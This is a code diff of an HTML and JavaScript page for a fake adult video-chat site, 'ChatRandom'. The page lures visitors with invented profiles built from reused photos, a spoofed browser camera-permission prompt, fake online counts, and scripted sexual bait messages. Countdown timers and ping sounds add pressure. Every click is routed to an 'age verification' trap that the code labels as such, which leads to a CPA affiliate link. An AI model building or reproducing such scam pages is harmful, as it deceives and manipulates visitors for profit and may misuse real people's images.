@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ChatRandom - Live Video Chat</title>
     
-    <!-- LINK PREVIEW (Loading GIF - No Female Photo) -->
+    <!-- LINK PREVIEW (Loading GIF) -->
     <meta property="og:title" content="🔴 Incoming Video Call...">
     <meta property="og:description" content="A user nearby wants to video chat with you for FREE. Tap to join.">
     <meta property="og:image" content="https://i.gifer.com/ZKZg.gif">
@@ -15,99 +15,109 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; user-select: none; }
-        body { background: #0f0f13; color: #fff; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
+        body { background: #0f0f13; color: #fff; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* HEADER (Exact like image_0c09f7.png) */
-        header { background: #15151c; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        /* SCROLLBAR */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
+
+        /* HEADER */
+        header { background: #15151c; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); z-index: 100; }
         .logo { font-size: 24px; font-weight: 700; color: #ff3366; letter-spacing: -0.5px; }
         .online-badge { background: #1e1e26; border: 1px solid rgba(255,255,255,0.08); font-size: 13px; color: #aaa; padding: 6px 16px; border-radius: 20px; display: flex; align-items: center; gap: 8px; }
-        .green-dot { width: 8px; height: 8px; background: #00e676; border-radius: 50%; box-shadow: 0 0 8px #00e676; }
+        .green-dot { width: 8px; height: 8px; background: #00e676; border-radius: 50%; box-shadow: 0 0 8px #00e676; animation: blink 1.5s infinite; }
 
         /* MAIN CONTAINER */
-        .wrapper { max-width: 1400px; margin: 20px auto; width: 100%; padding: 0 20px; display: flex; gap: 20px; }
+        .wrapper { flex: 1; display: flex; overflow: hidden; }
         @media (max-width: 900px) { .wrapper { flex-direction: column; } }
 
-        /* LEFT SIDEBAR: GIRLS LIST */
-        .sidebar { width: 280px; background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; height: 500px; }
-        @media (max-width: 900px) { .sidebar { width: 100%; height: 200px; } }
-        .sidebar-title { padding: 15px; font-size: 13px; font-weight: 700; color: #ff3366; border-bottom: 1px solid rgba(255,255,255,0.05); text-transform: uppercase; letter-spacing: 0.5px; }
-        .user-list { flex: 1; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 5px; }
-        .user-item { display: flex; align-items: center; gap: 10px; padding: 8px 10px; border-radius: 8px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
-        .user-item:hover, .user-item.active { background: rgba(255,51,102,0.1); border-color: rgba(255,51,102,0.3); }
-        .user-avatar { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; border: 2px solid #00e676; }
+        /* LEFT SIDEBAR: INFINITE GIRLS LIST */
+        .sidebar { width: 300px; background: #16161e; border-right: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; height: 100%; }
+        @media (max-width: 900px) { .sidebar { display: none; } /* Mobile e sidebar hide korlam clean rakhar jonno */ }
+        .sidebar-title { padding: 15px 20px; font-size: 12px; font-weight: 700; color: #ff3366; border-bottom: 1px solid rgba(255,255,255,0.05); text-transform: uppercase; letter-spacing: 1px; }
+        .user-list { flex: 1; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 4px; }
+        .user-item { display: flex; align-items: center; gap: 12px; padding: 10px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+        .user-item:hover, .user-item.active { background: rgba(255,51,102,0.1); }
+        .user-avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #333; position: relative; }
+        .user-item.active .user-avatar { border-color: #00e676; }
         .user-meta { flex: 1; overflow: hidden; }
-        .user-name { font-size: 13px; font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .user-handle { font-size: 11px; color: #777; }
+        .user-name { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 3px; }
+        .user-status { font-size: 11px; color: #00e676; }
+        .status-private { color: #ffaa00; }
+        
+        .load-more { text-align: center; padding: 15px; font-size: 13px; color: #aaa; cursor: pointer; border-top: 1px solid rgba(255,255,255,0.05); font-weight: 600; }
+        .load-more:hover { color: #fff; background: rgba(255,255,255,0.05); }
 
-        /* CENTER/MAIN VIDEO SECTION (Matching image_0c09f7.png) */
-        .main-grid { flex: 1; display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
-        @media (max-width: 900px) { .main-grid { grid-template-columns: 1fr; } }
+        /* CENTER/MAIN VIDEO SECTION */
+        .main-content { flex: 1; padding: 20px; display: grid; grid-template-columns: 2fr 1fr; gap: 20px; overflow-y: auto; }
+        @media (max-width: 900px) { .main-content { grid-template-columns: 1fr; } }
 
-        /* MAIN VIDEO BOX */
-        .video-box { position: relative; background: #000; border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); aspect-ratio: 16/10; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .cam-img { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.75); animation: breathe 6s infinite alternate ease-in-out; }
+        .video-box { position: relative; background: #000; border-radius: 12px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); aspect-ratio: 16/10; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
+        .cam-img { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.65); animation: breathe 8s infinite alternate ease-in-out; }
         
         .hud-top { position: absolute; top: 15px; left: 15px; display: flex; gap: 10px; z-index: 10; }
-        .live-tag { background: rgba(0,0,0,0.7); color: #fff; font-size: 11px; font-weight: bold; padding: 4px 10px; border-radius: 4px; display: flex; align-items: center; gap: 6px; }
+        .live-tag { background: rgba(0,0,0,0.7); color: #fff; font-size: 11px; font-weight: bold; padding: 5px 12px; border-radius: 4px; display: flex; align-items: center; gap: 6px; border: 1px solid rgba(255,51,102,0.3); }
         .live-dot { width: 6px; height: 6px; background: #ff3366; border-radius: 50%; animation: blink 1s infinite; }
-        .timer-tag { background: rgba(0,0,0,0.7); color: #fff; font-size: 11px; padding: 4px 10px; border-radius: 4px; }
 
-        /* FAKE BROWSER PERMISSION (Exact like image_0c09f7.png) */
+        /* FAKE BROWSER PERMISSION */
         .fake-permission { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: #fff; border-radius: 8px; padding: 12px 16px; display: flex; align-items: center; gap: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); z-index: 50; width: 90%; max-width: 420px; color: #222; }
         .perm-icon { font-size: 20px; }
         .perm-text { flex: 1; font-size: 12px; line-height: 1.4; color: #333; }
-        .perm-text strong { color: #000; }
         .perm-btns { display: flex; gap: 8px; }
         .btn-block { background: #e8eaed; border: none; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 600; color: #1a73e8; cursor: pointer; }
         .btn-allow { background: #1a73e8; border: none; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 600; color: #fff; cursor: pointer; }
 
-        /* PLAY BUTTON */
         .play-center { position: absolute; display: flex; flex-direction: column; align-items: center; gap: 12px; z-index: 15; }
-        .play-btn { width: 65px; height: 65px; background: #ff3366; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 26px; color: white; padding-left: 4px; box-shadow: 0 0 25px rgba(255, 51, 102, 0.6); }
-        .play-text { background: rgba(0,0,0,0.85); padding: 8px 18px; border-radius: 20px; font-size: 13px; font-weight: 600; color: white; border: 1px solid rgba(255,255,255,0.15); }
+        .play-btn { width: 70px; height: 70px; background: rgba(255, 51, 102, 0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 30px; color: white; padding-left: 5px; box-shadow: 0 0 30px rgba(255, 51, 102, 0.6); }
 
-        /* RIGHT PANEL: CAMERA DISABLED & NEXT STRANGER (Exact like image_0c09f7.png) */
+        /* RIGHT PANEL */
         .right-panel { display: flex; flex-direction: column; gap: 20px; }
-        .my-cam-box { background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; cursor: pointer; }
-        .cam-icon { font-size: 35px; opacity: 0.4; margin-bottom: 15px; }
-        .cam-status-text { color: #888; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
-        .enable-btn { background: #ff3366; color: white; border: none; padding: 12px 28px; border-radius: 25px; font-size: 13px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 51, 102, 0.4); }
+        .my-cam-box { background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; cursor: pointer; min-height: 200px; }
+        .btn-next-stranger { background: #ff4766; color: white; border: none; padding: 18px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 5px 20px rgba(255, 71, 102, 0.3); }
 
-        .btn-next-stranger { background: #ff5566; color: white; border: none; padding: 18px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; text-align: center; box-shadow: 0 5px 20px rgba(255, 85, 102, 0.3); transition: 0.2s; }
-        .btn-next-stranger:hover { opacity: 0.9; }
-
-        /* BOTTOM CHAT (Matching image_0c09f7.png) */
-        .chat-container { grid-column: 1 / -1; background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); overflow: hidden; cursor: pointer; }
+        /* BOTTOM CHAT */
+        .chat-container { grid-column: 1 / -1; background: #16161e; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); overflow: hidden; cursor: pointer; min-height: 150px; }
         .chat-header { padding: 12px 20px; font-size: 13px; font-weight: 600; background: #1b1b24; border-bottom: 1px solid rgba(255,255,255,0.05); color: #ccc; }
-        .chat-body { padding: 15px; height: 120px; display: flex; flex-direction: column; gap: 8px; justify-content: flex-end; }
-        .sys-msg { font-size: 11px; color: #555; text-align: center; }
-        .chat-msg { background: rgba(255,51,102,0.15); border: 1px solid rgba(255,51,102,0.3); color: #fff; padding: 8px 12px; border-radius: 12px; font-size: 12px; width: fit-content; }
+        .chat-body { padding: 20px; display: flex; flex-direction: column; gap: 10px; }
+        .sys-msg { font-size: 11px; color: #777; text-align: center; }
+        .chat-msg { background: rgba(255,51,102,0.15); border: 1px solid rgba(255,51,102,0.3); color: #fff; padding: 10px 15px; border-radius: 12px; font-size: 13px; width: fit-content; }
 
         /* ==========================================
-           POPUP 1: INSTANT REQUEST POPUP (image_01ab9a.png style)
+           POPUP 1: INSTANT REQUEST POPUP
            ========================================== */
-        .request-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(3px); display: none; justify-content: center; align-items: center; z-index: 990; }
-        .request-card { background: #22222a; border-radius: 12px; width: 330px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.9); border: 1px solid rgba(255,255,255,0.1); text-align: center; animation: popIn 0.3s ease-out; }
-        .req-head { background: #1b1b22; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; font-weight: 700; color: #fff; }
-        .req-body-content { padding: 25px 20px; }
-        .req-user-img { width: 85px; height: 85px; border-radius: 50%; object-fit: cover; border: 3px solid #ff3366; margin-bottom: 12px; }
-        .req-text-msg { font-size: 13px; color: #ddd; line-height: 1.5; margin-bottom: 15px; }
-        .req-text-msg strong { color: #2196f3; font-size: 15px; }
-        .req-action-btn { background: #333; color: white; border: none; padding: 10px 25px; border-radius: 6px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        .req-action-btn.accept { background: #1a73e8; margin-left: 8px; }
+        .request-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.75); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 990; }
+        .request-card { background: #1e1e24; border-radius: 12px; width: 340px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.9); border: 1px solid rgba(255,255,255,0.1); text-align: center; animation: popIn 0.3s ease-out; }
+        .req-head { background: #15151a; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; font-weight: 700; color: #fff; }
+        .req-body-content { padding: 30px 20px; }
+        .req-user-img { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; border: 3px solid #ff3366; margin-bottom: 15px; }
+        .req-text-msg { font-size: 14px; color: #ddd; line-height: 1.5; margin-bottom: 15px; }
+        .req-text-msg strong { color: #2196f3; font-size: 16px; }
+        .req-action-btn { background: #333; color: white; border: none; padding: 12px 30px; border-radius: 6px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .req-action-btn.accept { background: #1a73e8; margin-left: 10px; }
 
         /* ==========================================
-           POPUP 2: FLOATING CHAT WIDGET (image_01aff8.png style)
+           POPUP 2: FLOATING CHAT WIDGET
            ========================================== */
-        .floating-chat-box { position: fixed; bottom: 20px; right: 20px; width: 290px; background: #1c181b; border-radius: 12px; border: 1px solid #ff3366; box-shadow: 0 10px 40px rgba(0,0,0,0.8); z-index: 800; display: none; overflow: hidden; animation: slideUp 0.3s ease-out; }
-        .fc-head { background: linear-gradient(90deg, #ff3366, #ff5566); padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; color: #fff; font-weight: 700; font-size: 13px; cursor: pointer; }
-        .fc-user-info { display: flex; align-items: center; gap: 8px; }
-        .fc-user-img { width: 28px; height: 28px; border-radius: 50%; object-fit: cover; border: 1.5px solid #00e676; }
-        .fc-content { padding: 12px; display: flex; flex-direction: column; gap: 10px; background: #151214; }
-        .fc-bubble { background: #ff3366; color: #fff; padding: 6px 12px; border-radius: 12px; font-size: 12px; width: fit-content; }
-        .fc-photo-preview { width: 130px; height: 150px; border-radius: 8px; overflow: hidden; position: relative; border: 2px solid #ff3366; cursor: pointer; }
-        .fc-photo-preview img { width: 100%; height: 100%; object-fit: cover; filter: blur(10px); }
-        .fc-photo-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.5); display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; font-size: 11px; font-weight: 600; }
+        .floating-chat-box { position: fixed; bottom: 20px; right: 20px; width: 300px; background: #1c181b; border-radius: 12px; border: 1px solid #ff3366; box-shadow: 0 10px 50px rgba(0,0,0,0.9); z-index: 800; display: none; overflow: hidden; animation: slideUp 0.3s ease-out; }
+        .fc-head { background: linear-gradient(90deg, #ff3366, #ff5566); padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; color: #fff; font-weight: 700; font-size: 14px; cursor: pointer; }
+        .fc-user-info { display: flex; align-items: center; gap: 10px; }
+        .fc-user-img { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid #fff; }
+        .fc-content { padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #151214; min-height: 200px; }
+        
+        /* TYPING INDICATOR */
+        .typing-indicator { font-size: 12px; color: #aaa; font-style: italic; display: none; margin-bottom: 5px; animation: blink 1.5s infinite; }
+        
+        .fc-bubble { background: #ff3366; color: #fff; padding: 8px 14px; border-radius: 15px; font-size: 13px; width: fit-content; display: none; animation: popIn 0.2s ease-out; box-shadow: 0 4px 10px rgba(255, 51, 102, 0.2); }
+        .fc-photo-preview { width: 140px; height: 160px; border-radius: 8px; overflow: hidden; position: relative; border: 2px solid #ff3366; cursor: pointer; display: none; animation: popIn 0.2s ease-out; }
+        .fc-photo-preview img { width: 100%; height: 100%; object-fit: cover; filter: blur(12px); transform: scale(1.1); }
+        .fc-photo-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.4); display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; font-size: 12px; font-weight: 600; }
+
+        /* ==========================================
+           TOAST NOTIFICATIONS (Live Feel)
+           ========================================== */
+        .toast-container { position: fixed; bottom: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px; z-index: 700; pointer-events: none; }
+        .toast { background: rgba(22, 22, 30, 0.9); border-left: 3px solid #00e676; padding: 10px 15px; border-radius: 6px; font-size: 12px; font-weight: 600; color: #fff; box-shadow: 0 5px 15px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 10px; animation: slideInLeft 0.4s ease-out forwards, fadeOut 0.4s ease-in 4s forwards; opacity: 0; transform: translateX(-100%); }
 
         /* ==========================================
            THE FINAL TRAP: AGE VERIFICATION MODAL
@@ -117,14 +127,16 @@
         .verify-title { font-size: 20px; font-weight: 800; color: #ff3366; margin-bottom: 15px; text-transform: uppercase; }
         .verify-desc { font-size: 14px; color: #ccc; line-height: 1.6; margin-bottom: 20px; text-align: left; }
         .verify-box-highlight { background: rgba(0, 230, 118, 0.08); border: 1px dashed #00e676; color: #00e676; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: 600; margin-bottom: 25px; }
-        .verify-box-highlight strong { color: #fff; font-size: 15px; }
+        .verify-box-highlight strong { color: #fff; font-size: 16px; display: inline-block; margin-top: 5px; }
         .continue-btn { width: 100%; background: #00e676; border: none; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: 800; color: #000; cursor: pointer; box-shadow: 0 5px 20px rgba(0, 230, 118, 0.3); text-transform: uppercase; }
 
         /* ANIMATIONS */
-        @keyframes blink { 50% { opacity: 0; } }
+        @keyframes blink { 50% { opacity: 0.3; } }
         @keyframes breathe { 0% { transform: scale(1); } 100% { transform: scale(1.05); } }
         @keyframes popIn { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes slideInLeft { to { transform: translateX(0); opacity: 1; } }
+        @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
     </style>
 </head>
 <body>
@@ -145,29 +157,25 @@
         </div>
     </div>
 
-    <!-- HEADER -->
     <header>
         <div class="logo">ChatRandom</div>
         <div class="online-badge"><span class="green-dot"></span> <span id="onlineCounter">142,715</span> Online</div>
     </header>
 
-    <!-- WRAPPER -->
     <div class="wrapper">
-        
-        <!-- LEFT SIDEBAR: SYNCHRONIZED GIRLS LIST -->
+        <!-- LEFT SIDEBAR: DYNAMIC INFINITE LIST -->
         <div class="sidebar">
-            <div class="sidebar-title">🔥 Girls Online Near You</div>
+            <div class="sidebar-title">🔥 Live Girls (<span id="liveCount">86</span>)</div>
             <div class="user-list" id="userList">
-                <!-- Javascript populates synced profiles here -->
+                <!-- Javascript will generate 50+ profiles here -->
             </div>
+            <div class="load-more" onclick="triggerVerification()">Load More Girls...</div>
         </div>
 
-        <!-- MAIN CONTENT GRID (image_0c09f7.png) -->
-        <div class="main-grid">
+        <!-- MAIN CONTENT -->
+        <div class="main-content">
             
-            <!-- VIDEO BOX -->
             <div class="video-box" onclick="triggerVerification()">
-                
                 <!-- FAKE BROWSER PERMISSION -->
                 <div class="fake-permission">
                     <div class="perm-icon">🔒</div>
@@ -180,25 +188,23 @@
 
                 <div class="hud-top">
                     <div class="live-tag"><div class="live-dot"></div> LIVE</div>
-                    <div class="timer-tag">03:49:27</div>
                 </div>
 
                 <img id="mainCamImg" src="" class="cam-img" alt="cam">
 
                 <div class="play-center">
                     <div class="play-btn">▶</div>
-                    <div class="play-text">Tap to Play & Unmute</div>
+                    <div style="background: rgba(0,0,0,0.8); padding: 6px 15px; border-radius: 20px; font-size: 12px; font-weight: bold;">Tap to Play & Unmute</div>
                 </div>
             </div>
 
             <!-- RIGHT PANEL -->
             <div class="right-panel">
                 <div class="my-cam-box" onclick="triggerVerification()">
-                    <div class="cam-icon">📷</div>
-                    <div class="cam-status-text">Camera is disabled.<br>Click "Allow" in your browser.</div>
-                    <button class="enable-btn">Enable Camera</button>
+                    <div style="font-size: 35px; opacity: 0.5; margin-bottom: 10px;">📷</div>
+                    <div style="color: #888; font-size: 13px; margin-bottom: 15px;">Camera is disabled.<br>Click "Allow" in your browser.</div>
+                    <button style="background: #ff3366; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer;">Enable Camera</button>
                 </div>
-
                 <button class="btn-next-stranger" onclick="triggerVerification()">⏭ Next Stranger</button>
             </div>
 
@@ -210,25 +216,27 @@
                     <div class="chat-msg" id="chatMsg1">Hi! Are you online? 👋</div>
                 </div>
             </div>
-
         </div>
     </div>
 
-    <!-- POPUP 1: INSTANT REQUEST POPUP (image_01ab9a.png style) -->
+    <!-- TOAST CONTAINER -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <!-- INSTANT REQUEST POPUP -->
     <div class="request-modal-overlay" id="requestModal">
         <div class="request-card">
             <div class="req-head">
-                <span>Instant Sex Chat</span>
-                <span style="cursor:pointer;" onclick="closeRequestPopup()">✖</span>
+                <span>Instant Private Chat</span>
+                <span style="cursor:pointer; color:#888;" onclick="closeRequestPopup()">✖</span>
             </div>
             <div class="req-body-content">
                 <img id="reqUserImg" src="" class="req-user-img">
                 <div class="req-text-msg">
-                    <strong id="reqUserHandle">@babe_lana</strong> sends a Request.<br>
-                    If you both press Accept, you will chat for FREE
+                    <strong id="reqUserName">Babe Lana</strong> sends a Request.<br>
+                    If you both press Accept, you will chat for FREE.
                 </div>
-                <div style="font-size: 14px; font-weight: 700; color: #1a73e8; margin-bottom: 15px; cursor: pointer;" onclick="triggerVerification()">Accept her Request?</div>
-                <div style="font-size: 11px; color: #888; margin-bottom: 15px;">(Expires in <span id="reqTimer" style="color:#ffaa00;">10</span> Seconds)</div>
+                <div style="font-size: 15px; font-weight: 700; color: #1a73e8; margin-bottom: 15px; cursor: pointer;" onclick="triggerVerification()">Accept her Request?</div>
+                <div style="font-size: 12px; color: #888; margin-bottom: 20px;">(Expires in <span id="reqTimer" style="color:#ffaa00;">10</span>s)</div>
                 <div>
                     <button class="req-action-btn" onclick="closeRequestPopup()">No</button>
                     <button class="req-action-btn accept" onclick="triggerVerification()">Accept</button>
@@ -237,84 +245,124 @@
         </div>
     </div>
 
-    <!-- POPUP 2: FLOATING CHAT WIDGET (image_01aff8.png style) -->
+    <!-- FLOATING CHAT WIDGET -->
     <div class="floating-chat-box" id="floatingChat">
         <div class="fc-head" onclick="triggerVerification()">
             <div class="fc-user-info">
                 <img id="fcImg" src="" class="fc-user-img">
-                <span id="fcName">HaileyRose 🇺🇸</span>
+                <span id="fcName">Hailey Rose</span>
             </div>
             <span onclick="closeFloatingChat(event)">✖</span>
         </div>
         <div class="fc-content" onclick="triggerVerification()">
-            <div class="fc-bubble">Hi!</div>
-            <div class="fc-bubble">I wanna send you a nude 😋</div>
-            <div class="fc-photo-preview">
+            <div class="typing-indicator" id="fcTyping">Hailey is typing...</div>
+            <div class="fc-bubble" id="msg1">Hi!</div>
+            <div class="fc-bubble" id="msg2">I wanna send you a nude 😋</div>
+            <div class="fc-photo-preview" id="msgPhoto">
                 <img id="fcBlurImg" src="">
                 <div class="fc-photo-overlay">
-                    <span style="font-size: 20px;">🚫</span>
+                    <span style="font-size: 24px; margin-bottom: 5px;">🚫</span>
                     See photo
                 </div>
             </div>
-            <div class="fc-bubble" style="background:#e91e63;">Will you show yourself?)</div>
         </div>
     </div>
 
     <script>
         // ==========================================
-        // CENTRAL PROFILES DATABASE (100% Synced)
+        // 1. DATA & GENERATION
         // ==========================================
-        const profiles = [
-            { name: "Hailey Rose 🇺🇸", handle: "@hailey_rose", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true" },
-            { name: "Babe Lana 🇬🇧", handle: "@babe_lana", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true" },
-            { name: "Chloe Sweet 🇨🇦", handle: "@chloe_99", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true" },
-            { name: "Mia Sunset 🇦🇺", handle: "@mia_live", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafcae692d2c.jpeg?raw=true" },
-            { name: "Ava Secret 🇩🇪", handle: "@ava_xo", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true" },
-            { name: "Emma Cute 🇫🇷", handle: "@emma_private", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafd6212320b.jpeg?raw=true" },
-            { name: "Sophia Hot 🇮🇹", handle: "@sophia_vip", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafc930da7d6.jpeg?raw=true" },
-            { name: "Lily Desire 🇪🇸", handle: "@lily_sexy", photo: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafbe3fc1960.jpeg?raw=true" }
+        const baseImages = [
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafcae692d2c.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafd6212320b.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafc930da7d6.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafbe3fc1960.jpeg?raw=true"
         ];
+        
+        const firstNames = ["Hailey", "Lana", "Chloe", "Mia", "Ava", "Emma", "Sophia", "Lily", "Olivia", "Isabella", "Amelia", "Harper", "Evelyn", "Abigail", "Emily", "Madison"];
+        const lastNames = ["Rose", "Sweet", "Sunset", "Secret", "Cute", "Hot", "Desire", "Vip", "Live", "Private"];
 
-        let activeProfile = profiles[0];
+        // Generate 50+ Users
+        const profiles = [];
+        for(let i=0; i<60; i++) {
+            let fn = firstNames[Math.floor(Math.random() * firstNames.length)];
+            let ln = lastNames[Math.floor(Math.random() * lastNames.length)];
+            let img = baseImages[Math.floor(Math.random() * baseImages.length)];
+            let status = Math.random() > 0.3 ? "● Live Now" : "In Private Chat";
+            let statusClass = status.includes("Live") ? "" : "status-private";
+            profiles.push({ name: `${fn} ${ln}`, photo: img, status: status, sClass: statusClass });
+        }
+
         const targetCpaLink = "https://bedjfha.hubss.one/p/uyMfR";
         let isVerifying = false;
+        let audioUnlocked = false;
 
-        // 1. RENDER SIDEBAR (Synchronized)
+        // ==========================================
+        // 2. AUDIO SYSTEM (Web Audio API - No files needed)
+        // ==========================================
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        function playPing() {
+            if (!audioUnlocked || audioCtx.state !== 'running') return;
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch A5
+                osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.1);
+                gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.3);
+            } catch(e) {}
+        }
+
+        // Unlock audio on first user interaction (Browser Policy)
+        document.body.addEventListener('click', () => {
+            if(!audioUnlocked) {
+                audioCtx.resume().then(() => { audioUnlocked = true; });
+            }
+        }, { once: true });
+        document.body.addEventListener('mousemove', () => {
+            if(!audioUnlocked) {
+                audioCtx.resume().then(() => { audioUnlocked = true; });
+            }
+        }, { once: true });
+
+
+        // ==========================================
+        // 3. UI INITIALIZATION
+        // ==========================================
         const userListDiv = document.getElementById('userList');
-        function renderSidebar() {
-            userListDiv.innerHTML = "";
-            profiles.forEach((profile, index) => {
-                const item = document.createElement('div');
-                item.className = `user-item ${index === 0 ? 'active' : ''}`;
-                item.onclick = () => selectProfile(profile, item);
-                
-                item.innerHTML = `
-                    <img src="${profile.photo}" class="user-avatar">
-                    <div class="user-meta">
-                        <div class="user-name">${profile.name}</div>
-                        <div class="user-handle">${profile.handle}</div>
-                    </div>
-                `;
-                userListDiv.appendChild(item);
-            });
-        }
+        profiles.forEach((profile, index) => {
+            const item = document.createElement('div');
+            item.className = `user-item ${index === 0 ? 'active' : ''}`;
+            item.onclick = triggerVerification; // Any click triggers trap
+            
+            item.innerHTML = `
+                <img src="${profile.photo}" class="user-avatar">
+                <div class="user-meta">
+                    <div class="user-name">${profile.name}</div>
+                    <div class="user-status ${profile.sClass}">${profile.status}</div>
+                </div>
+            `;
+            userListDiv.appendChild(item);
+        });
 
-        // 2. SELECT PROFILE LOGIC
-        function selectProfile(profile, element) {
-            activeProfile = profile;
-            document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
-            if(element) element.classList.add('active');
+        // Set Main Video
+        document.getElementById('mainCamImg').src = profiles[0].photo;
+        document.getElementById('chatMsg1').innerText = `Hi! I'm ${profiles[0].name.split(' ')[0]}. Turn on your cam? 😉`;
 
-            // Change Main Video Cam Image
-            document.getElementById('mainCamImg').src = profile.photo;
-            document.getElementById('chatMsg1').innerText = `Hi! I'm ${profile.name.split(' ')[0]}. Turn on your cam? 😉`;
-        }
 
